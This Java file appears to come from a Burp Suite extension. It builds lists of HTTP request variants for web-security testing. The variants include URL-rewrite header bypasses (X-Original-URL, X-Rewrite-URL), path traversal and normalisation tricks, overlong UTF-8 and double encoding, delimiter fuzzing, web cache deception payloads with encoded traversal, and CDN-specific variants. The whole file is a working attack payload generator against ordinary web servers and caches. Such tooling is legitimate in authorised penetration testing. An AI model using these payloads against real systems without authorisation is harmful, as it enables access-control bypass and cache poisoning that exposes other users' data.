package burp.payload;

import burp.core.ExtensionContext;
import burp.core.Variant;
import burp.util.EncoderUtils;

import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.ArrayList;
import java.util.List;

public class PathPayloadBuilder {

    private final ExtensionContext ctx;

    public PathPayloadBuilder(ExtensionContext ctx) {
        this.ctx = ctx;
    }

    public List<Variant> build(HttpRequest baseReq) {
        List<Variant> out = new ArrayList<>();
        String path = baseReq.path();
        if (ctx.chkPathRewrite.isSelected()) {
            String pathOnly = path.contains("?") ? path.substring(0, path.indexOf('?')) : path;
            String query    = path.contains("?") ? path.substring(path.indexOf('?')) : "";
            out.add(new Variant("REWRITE: X-Original-URL → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/" + query), "X-Original-URL", pathOnly)));
            out.add(new Variant("REWRITE: X-Rewrite-URL → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/" + query), "X-Rewrite-URL", pathOnly)));
            out.add(new Variant("REWRITE: X-Original-URL (full) → " + path,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), "X-Original-URL", path)));
            out.add(new Variant("REWRITE: X-Rewrite-URL (full) → " + path,
                    EncoderUtils.addOrReplaceHeader(baseReq.withPath("/"), "X-Rewrite-URL", path)));
            out.add(new Variant("REWRITE: X-Accel-Redirect → " + pathOnly,
                    EncoderUtils.addOrReplaceHeader(baseReq, "X-Accel-Redirect", pathOnly)));
            String[] probeMethods = {"TRACE", "OPTIONS", "POST", "PUT", "PATCH", "HEAD"};
            for (String m : probeMethods)
                out.add(new Variant("METHOD: " + m, baseReq.withMethod(m)));
        }
        if (ctx.chkPathNorm.isSelected()) {
            out.add(new Variant("PATH: Trailing slash",        baseReq.withPath(path.endsWith("/") ? path : path + "/")));
            out.add(new Variant("PATH: Double slash prefix",   baseReq.withPath("//" + path)));
            out.add(new Variant("PATH: /..;/ injection",       baseReq.withPath(EncoderUtils.injectDotDotSemicolon(path))));
            out.add(new Variant("PATH: /..;/..;/ double injection", baseReq.withPath("/..;/..;" + path)));
            out.add(new Variant("PATH: ; suffix",              baseReq.withPath(path.endsWith(";") ? path : path + ";")));
            out.add(new Variant("PATH: .json suffix",          baseReq.withPath(path + ".json")));
            out.add(new Variant("PATH: .html suffix",          baseReq.withPath(path + ".html")));
            out.add(new Variant("PATH: Case Flip",             baseReq.withPath(EncoderUtils.flipCase(path))));
            out.add(new Variant("PATH: /./ dot segment",       baseReq.withPath("/./" + EncoderUtils.stripLeadingSlash(path))));
            out.add(new Variant("PATH: /. suffix",             baseReq.withPath(path + "/.")));
            out.add(new Variant("PATH: %20 suffix",            baseReq.withPath(path + "%20")));
            out.add(new Variant("PATH: %09 suffix",            baseReq.withPath(path + "%09")));
        }
        if (ctx.chkPathAdvanced.isSelected()) {
            out.add(new Variant("ENC: URL Encode",           baseReq.withPath(EncoderUtils.urlEncode(path))));
            out.add(new Variant("ENC: Double URL",           baseReq.withPath(EncoderUtils.urlEncode(EncoderUtils.urlEncode(path)))));
            out.add(new Variant("ENC: IIS Unicode",          baseReq.withPath(EncoderUtils.iisUnicodeEncode(path))));
            out.add(new Variant("ENC: Overlong UTF-8 ..%c0%af",  baseReq.withPath(path.replace("/", "/..%c0%af"))));
            out.add(new Variant("ENC: Overlong UTF-8 ..%c1%9c",  baseReq.withPath(path.replace("/", "/..%c1%9c"))));
            out.add(new Variant("ENC: Fullwidth / (%ef%bc%8f)",  baseReq.withPath(path.replace("/", "%ef%bc%8f"))));
            out.add(new Variant("ENC: Backslash ..%5c",          baseReq.withPath(path.replace("/", "/..%5c"))));
            out.add(new Variant("ENC: Windows backslash",         baseReq.withPath(path.replace("/", "\\"))));
        }
        if (ctx.chkPathDelimiter.isSelected()) {
            String suffix = ctx.txtDelimSuffix.getText().trim();
            if (suffix.isEmpty()) suffix = "abc";
            String[] rawDelimiters = {"?", "#", ";", "@", "!", "$", "&", "'", "(", ")", "*", "+", ",", "=",
                    "~", ".", "%", "|", "^", "`", "{{", "}}", "[", "]", "\\", ":", "\n", "\r", "\t", " "};
            for (String d : rawDelimiters) {
                String display = d.replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t").replace(" ", "<SP>");
                out.add(new Variant("DELIM: '" + display + "'", baseReq.withPath(path + d + suffix)));
            }
            String[] encodedDelimiters = {"%23", "%3f", "%3F", "%3b", "%3B", "%2f", "%2F", "%5c", "%5C",
                    "%00", "%0a", "%0A", "%0d", "%0D", "%09", "%20", "%25", "%26", "%40", "%21",
                    "%24", "%27", "%28", "%29", "%2a", "%2A", "%2b", "%2B", "%2c", "%2C",
                    "%3d", "%3D", "%7e", "%7E", "%7c", "%7C", "%5e", "%5E", "%60",
                    "%7b", "%7B", "%7d", "%7D", "%5b", "%5B", "%5d", "%5D"};
            for (String d : encodedDelimiters)
                out.add(new Variant("DELIM-ENC: '" + d + "'", baseReq.withPath(path + d + suffix)));
        }
        if (ctx.chkPathDelimExt.isSelected()) {
            String suffix = ctx.txtDelimSuffix.getText().trim();
            if (suffix.isEmpty()) suffix = "abc";
            String[] staticExts = {".js", ".css", ".png", ".jpg", ".gif", ".svg", ".ico", ".woff", ".woff2",
                    ".ttf", ".eot", ".map", ".json", ".xml", ".yaml", ".webp", ".avif", ".txt", ".pdf"};
            String[] testDelims = {"?", "%23", "%3f", "%3F", ";", "%3b", "%3B"};
            for (String d : testDelims)
                for (String ext : staticExts)
                    out.add(new Variant("DELIM+EXT: '" + d + "' + " + ext,
                            baseReq.withPath(path + d + suffix + ext)));
        }
        if (ctx.chkPathNormDisc.isSelected()) {
            String cachePrefix = ctx.txtCachePrefix.getText().trim();
            if (cachePrefix.isEmpty()) cachePrefix = "/resources";
            out.add(new Variant("NORM: /aaa/..%2f" + path,
                    baseReq.withPath("/aaa/..%2f" + EncoderUtils.stripLeadingSlash(path))));
            out.add(new Variant("NORM: /aaa/..%5c" + path,
                    baseReq.withPath("/aaa/..%5c" + EncoderUtils.stripLeadingSlash(path))));
            out.add(new Variant("NORM: /aaa/%2e%2e/" + path,
                    baseReq.withPath("/aaa/%2e%2e/" + EncoderUtils.stripLeadingSlash(path))));
            out.add(new Variant("NORM: /aaa/%2e%2e%2f" + path,
                    baseReq.withPath("/aaa/%2e%2e%2f" + EncoderUtils.stripLeadingSlash(path))));
            out.add(new Variant("NORM-CACHE: /aaa/..%2f" + cachePrefix,
                    baseReq.withPath("/aaa/..%2f" + EncoderUtils.stripLeadingSlash(cachePrefix) + "/test")));
            out.add(new Variant("NORM-CACHE: " + cachePrefix + "/..%2ftest",
                    baseReq.withPath(cachePrefix + "/..%2ftest")));
            out.add(new Variant("NORM: %252F double-enc",  baseReq.withPath(path.replace("/", "%252F"))));
            out.add(new Variant("NORM: BOM+path",          baseReq.withPath("%EF%BB%BF" + path)));
            out.add(new Variant("NORM: path%00.css",       baseReq.withPath(path + "%00.css")));
            out.add(new Variant("NORM: %c0%af slash",      baseReq.withPath(path.replace("/", "%c0%af"))));
        }
        if (ctx.chkPathCacheCombo.isSelected()) {
            String cachePrefix = ctx.txtCachePrefix.getText().trim();
            if (cachePrefix.isEmpty()) cachePrefix = "/resources";
            String[] comboDelims = {"?", "%23", "%3f", "%3F", ";", "%3b", "%3B", "%00"};
            String encodedTraversal = "%2f%2e%2e%2f";
            for (String d : comboDelims) {
                out.add(new Variant("WCD: '" + d + "' + traversal + " + cachePrefix,
                        baseReq.withPath(path + d + encodedTraversal + EncoderUtils.stripLeadingSlash(cachePrefix))));
                out.add(new Variant("WCD+CB: '" + d + "' + traversal + " + cachePrefix + "?cb",
                        baseReq.withPath(path + d + encodedTraversal + EncoderUtils.stripLeadingSlash(cachePrefix) + "?wcd")));
            }
        }
        if (ctx.chkPathDelimiter.isSelected() && ctx.cmbCdnProfile != null) {
            String sfx = ctx.txtDelimSuffix.getText().trim();
            if (sfx.isEmpty()) sfx = "abc";
            String cdnProfile = (String) ctx.cmbCdnProfile.getSelectedItem();
            if ("Cloudflare".equals(cdnProfile)) {
                out.add(new Variant("CDN-CF: cf_chl param",    baseReq.withPath(path + "?__cf_chl_rt_tk=ACF")));
                out.add(new Variant("CDN-CF: %23 fragment",    baseReq.withPath(path + "%23" + sfx)));
                out.add(new Variant("CDN-CF: ;x.css",          baseReq.withPath(path + ";" + sfx + ".css")));
            } else if ("Akamai".equals(cdnProfile)) {
                out.add(new Variant("CDN-AK: ;%3b semicolon",  baseReq.withPath(path + ";%3b" + sfx)));
                out.add(new Variant("CDN-AK: akamaighost",     baseReq.withPath(path + "?akamaighost=" + sfx)));
            } else if ("Fastly".equals(cdnProfile)) {
                out.add(new Variant("CDN-FA: %3f query",       baseReq.withPath(path + "%3f" + sfx)));
                out.add(new Variant("CDN-FA: /F/ path prefix", baseReq.withPath("/F" + path)));
            } else if ("CloudFront".equals(cdnProfile)) {
                out.add(new Variant("CDN-CF2: # fragment",     baseReq.withPath(path + "#" + sfx)));
                out.add(new Variant("CDN-CF2: %23 enc frag",   baseReq.withPath(path + "%23" + sfx)));
            } else if ("Nginx".equals(cdnProfile)) {
                out.add(new Variant("CDN-NX: %3f nginx",       baseReq.withPath(path + "%3f" + sfx)));
                out.add(new Variant("CDN-NX: // double slash", baseReq.withPath("//" + EncoderUtils.stripLeadingSlash(path))));
            } else if ("Varnish".equals(cdnProfile)) {
                out.add(new Variant("CDN-VN: grace period",    baseReq.withPath(path + "?" + sfx + "=varnish")));
                out.add(new Variant("CDN-VN: xkey param",      baseReq.withPath(path + "?xkey=" + sfx)));
            }
        }
        if (ctx.chkPathFatGet != null && ctx.chkPathFatGet.isSelected()) {
            String cb = "wcd_cb=1";
            out.add(new Variant("FAT-GET: body=" + cb,
                    baseReq.withRemovedHeader("Content-Type")
                           .withRemovedHeader("Content-Length")
                           .withAddedHeader("Content-Type", "application/x-www-form-urlencoded")
                           .withAddedHeader("Content-Length", String.valueOf(cb.length()))
                           .withBody(cb)));
        }
        for (String p : ctx.txtPathPaths.getText().split("\\r?\\n"))
            if (!p.trim().isEmpty())
                out.add(new Variant("CUSTOM PATH: " + p.trim(), baseReq.withPath(p.trim())));
        return out;
    }
}
